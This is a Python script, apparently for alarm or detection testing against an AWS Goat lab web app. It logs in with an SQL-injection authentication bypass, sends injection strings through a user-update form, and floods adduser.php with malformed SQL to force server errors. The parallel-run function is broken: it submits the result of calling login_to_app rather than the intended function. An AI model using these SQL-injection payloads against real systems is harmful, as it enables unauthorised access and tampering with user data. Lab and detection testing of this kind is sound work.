import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

# Suppress SSL warnings for the self-signed certificate
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define your target URLs
BASE_URL = "https://aws-goat-m2-alb-626314027.eu-central-1.elb.amazonaws.com"
LOGIN_URL = f"{BASE_URL}/login.php"
UPDATE_URL = f"{BASE_URL}/superadmin/updateuser.php" # Update this path based on where the PHP file lives
ADD_USER_URL = f"{BASE_URL}/superadmin/adduser.php"

def login_to_app():
    """Authenticates and returns the session object."""
    session = requests.Session()
    session.verify = False  # Ignore self-signed cert errors globally
    
    login_payload = {
        "email": "'or '1'='1' LIMIT 1#", 
        "password": "your_secure_password",
        "submit": "true"
    }
    
    print(f"[*] Authenticating to {LOGIN_URL}...")
    response = session.post(LOGIN_URL, data=login_payload, allow_redirects=True)
    
    print(f" Status code: {response.status_code}")
    
    if "Email or Password is Wrong" in response.text:
        print("[-] Login failed..")
        return None
    
    if not "Announcements" in response.text:
        print("[-] Login failed.")
        return None
        
    print("[+] Login successful.")
    return session

def trigger_bulk_update(session, iterations=10):
    """Hits the update endpoint N times to trigger velocity/bulk alarms."""
    
    # This payload matches the $_REQUEST variables in the PHP script
    update_payload = {
        "update_user": "true",       # CRITICAL: Triggers the if(isset($_POST['update_user']))
        "username": "teststts",
		"inputfirstname": "Stefan",  
        "inputlastname": "'or '1'='1' LIMIT 1 #",
        "inputphone": "555-0000",
        "inputEmail": "user@example.com",
        "inputAddress": "123 CloudWatch Lane",
        "inputssn": "000-00-0000",
        "inputbank": "999888777",
        "inputnewPassword": "",      # Left blank so it doesn't trigger the logout.php redirect
        "inputcnfPassword": ""       # Left blank so it doesn't trigger the logout.php redirect
    }

    print(f"[*] Starting bulk update simulation ({iterations} requests)...")
    
    for i in range(1, iterations + 1):
        try:
            # We use allow_redirects=False here so we don't unnecessarily download 
            # the user-settings.php HTML page 10 times, saving time.
            response = session.post(UPDATE_URL, data=update_payload, allow_redirects=False)
            
            # The PHP script uses header('Location: user-settings.php') on success, 
            # which results in an HTTP 302 redirect.
            if response.status_code == 302:
                print(f"  [+] Request {i}/{iterations} succeeded (HTTP 302 Redirect).")
            else:
                print(f"  [-] Request {i}/{iterations} failed or returned unexpected status: HTTP {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"  [-] Connection error on request {i}: {e}")
            
def trigger_server_error(session, iterations=10):
    """Hits adduser.php with malformed SQL to force an HTTP 500."""
    
    # Payload with a single quote to break the MySQL syntax
    crash_payload = {
        "username": "ErrorTestUsersss",
        "email": "test@example.comss'",  # <--- The syntax breaker
        "password": "password123",
        "isadmin": "0",
        "organization_id": "1",
        "firstname": "Error",
        "lastname": "Test",
        "address": "123 Error Lane",
        "ssn": "000-00-0000",
        "bank_account": "00000",
        "phone": "555-0000"
    }
    
    
    print(f"[*] Starting 500 error simulation ({iterations} requests)...")
    
    for i in range(1, iterations + 1):
        try:
            response = session.post(ADD_USER_URL, data=crash_payload, allow_redirects=False)
            
            # We expect a 500 error because of the SQL syntax crash
            if response.status_code == 500:
                print(f"  [+] Request {i}/{iterations} caused HTTP 500 (Success).")
            else:
                print(f"  [-] Request {i}/{iterations} did NOT cause 500. Status: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"  [-] Connection error: {e}")
            
def run_in_parallel(num_requests=10):
    """Executes the crash function 10 times in parallel using threads."""
    
    # We use a ThreadPoolExecutor to run tasks concurrently
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Create a list of tasks
        # This will call trigger_server_error 10 times, each with 1 iteration
        futures = [executor.submit(login_to_app(), 1) for _ in range(num_requests)]
        
    print(f"[*] All {num_requests} parallel requests have been dispatched.")

if __name__ == "__main__":
    # 1. Establish the authenticated session
    run_in_parallel()
    active_session = login_to_app()
    
    # 2. If logged in, fire the 10 update requests
    if active_session:
        print("-" * 40)
        # You can change the number of requests by modifying the parameter here
        #trigger_bulk_update(active_session, iterations=2)
        trigger_server_error(active_session, iterations=1)